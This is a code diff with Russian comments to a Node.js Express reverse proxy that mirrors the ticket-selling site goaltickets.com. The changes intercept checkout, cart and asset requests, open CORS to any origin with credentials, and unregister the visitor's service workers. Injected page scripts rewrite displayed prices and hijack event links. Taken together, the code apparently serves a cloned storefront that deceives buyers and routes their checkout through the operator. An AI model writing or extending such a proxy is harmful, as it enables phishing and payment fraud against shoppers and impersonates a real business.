@@ -95,6 +95,33 @@ app.get('*checkout*', (req, res) => {
       next();
     });
 
+    // Проксируем все скрипты и ресурсы
+    app.get('/checkouts/internal/*', (req, res, next) => {
+      console.log('🔧 Internal script intercepted:', req.url);
+      next();
+    });
+
+    app.get('/assets/*', (req, res, next) => {
+      console.log('📦 Assets intercepted:', req.url);
+      next();
+    });
+
+    app.get('/cdn/shop/*', (req, res, next) => {
+      console.log('📦 Shop CDN intercepted:', req.url);
+      next();
+    });
+
+    // Проксируем все внешние ресурсы
+    app.get('/cdnwidget/*', (req, res, next) => {
+      console.log('📦 CDN Widget intercepted:', req.url);
+      next();
+    });
+
+    app.get('/cdn/shopifycloud/*', (req, res, next) => {
+      console.log('📦 Shopify Cloud intercepted:', req.url);
+      next();
+    });
+
     // Проксируем все AJAX запросы к корзине
     app.post('/cart/add.js', (req, res, next) => {
       console.log('🛒 Cart add.js intercepted:', req.url);
@@ -202,10 +229,28 @@ const proxyOptions = {
           proxyRes.headers['Cache-Control'] = 'public, max-age=300'; // 5 минут кэш
         }
         
-        // Добавляем CORS
+        // Добавляем CORS для всех ресурсов
         proxyRes.headers['Access-Control-Allow-Origin'] = '*';
         proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
-        proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With';
+        proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma';
+        proxyRes.headers['Access-Control-Allow-Credentials'] = 'true';
+        proxyRes.headers['Access-Control-Expose-Headers'] = 'Content-Length, Content-Type, Date, Server, Transfer-Encoding';
+        
+        // Исправляем MIME типы для скриптов
+        if (req.url.includes('.js')) {
+          proxyRes.headers['Content-Type'] = 'application/javascript; charset=utf-8';
+        }
+        
+        // Исправляем MIME типы для CSS
+        if (req.url.includes('.css')) {
+          proxyRes.headers['Content-Type'] = 'text/css; charset=utf-8';
+        }
+        
+        // Исправляем MIME типы для шрифтов
+        if (req.url.includes('.woff') || req.url.includes('.woff2') || req.url.includes('.ttf') || req.url.includes('.eot')) {
+          proxyRes.headers['Content-Type'] = 'font/woff2';
+          proxyRes.headers['Access-Control-Allow-Origin'] = '*';
+        }
         
         // Перехватываем JSON ответы для изменения цен
         if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('application/json')) {
@@ -572,9 +617,21 @@ const proxyOptions = {
                 });
               }
               
-              // 🎯 ИЗМЕНЕНИЕ ЦЕН НА СТРАНИЦЕ
-              function modifyPricesOnPage() {
-                console.log('💰 Modifying prices on page...');
+                  // 🎯 ИСПРАВЛЕНИЕ SERVICE WORKER
+                  function fixServiceWorker() {
+                    // Отключаем Service Worker
+                    if ('serviceWorker' in navigator) {
+                      navigator.serviceWorker.getRegistrations().then(function(registrations) {
+                        for(let registration of registrations) {
+                          registration.unregister();
+                        }
+                      });
+                    }
+                  }
+                  
+                  // 🎯 ИЗМЕНЕНИЕ ЦЕН НА СТРАНИЦЕ
+                  function modifyPricesOnPage() {
+                    console.log('💰 Modifying prices on page...');
                 
                 // Ищем все элементы с ценами
                 const priceSelectors = [
@@ -658,15 +715,18 @@ const proxyOptions = {
                 });
               }
               
-              // Запускаем перехват ссылок
-              setTimeout(interceptEventLinks, 100);
-              setTimeout(interceptEventLinks, 1000);
-              setTimeout(interceptEventLinks, 3000);
-              
-              // Запускаем изменение цен
-              setTimeout(modifyPricesOnPage, 500);
-              setTimeout(modifyPricesOnPage, 2000);
-              setTimeout(modifyPricesOnPage, 5000);
+                  // Запускаем перехват ссылок
+                  setTimeout(interceptEventLinks, 100);
+                  setTimeout(interceptEventLinks, 1000);
+                  setTimeout(interceptEventLinks, 3000);
+                  
+                  // Запускаем изменение цен
+                  setTimeout(modifyPricesOnPage, 500);
+                  setTimeout(modifyPricesOnPage, 2000);
+                  setTimeout(modifyPricesOnPage, 5000);
+                  
+                  // Исправляем Service Worker
+                  setTimeout(fixServiceWorker, 1000);
               
               // Агрессивный поиск и изменение цен по всему документу
               function aggressivePriceModification() {
@@ -757,18 +817,36 @@ const proxyOptions = {
 // Применяем прокси только к корневой странице
 app.get('/', createProxyMiddleware(proxyOptions));
 
-// Для всех остальных GET запросов - прокси к оригинальному сайту
-app.get('*', createProxyMiddleware({
-  target: 'https://goaltickets.com',
-  changeOrigin: true,
-  secure: true,
-  timeout: 5000,
-  onError: (err, req, res) => {
-    if (!res.headersSent) {
-      res.status(404).send('Not found');
-    }
-  }
-}));
+    // Для всех остальных GET запросов - прокси к оригинальному сайту
+    app.get('*', createProxyMiddleware({
+      target: 'https://goaltickets.com',
+      changeOrigin: true,
+      secure: true,
+      timeout: 5000,
+      onProxyRes: (proxyRes, req, res) => {
+        // Добавляем CORS для всех ресурсов
+        proxyRes.headers['Access-Control-Allow-Origin'] = '*';
+        proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
+        proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma';
+        proxyRes.headers['Access-Control-Allow-Credentials'] = 'true';
+        
+        // Исправляем MIME типы
+        if (req.url.includes('.js')) {
+          proxyRes.headers['Content-Type'] = 'application/javascript; charset=utf-8';
+        }
+        if (req.url.includes('.css')) {
+          proxyRes.headers['Content-Type'] = 'text/css; charset=utf-8';
+        }
+        if (req.url.includes('.woff') || req.url.includes('.woff2') || req.url.includes('.ttf') || req.url.includes('.eot')) {
+          proxyRes.headers['Content-Type'] = 'font/woff2';
+        }
+      },
+      onError: (err, req, res) => {
+        if (!res.headersSent) {
+          res.status(404).send('Not found');
+        }
+      }
+    }));
 
 // Обработка ошибок
 app.use((err, req, res, next) => {
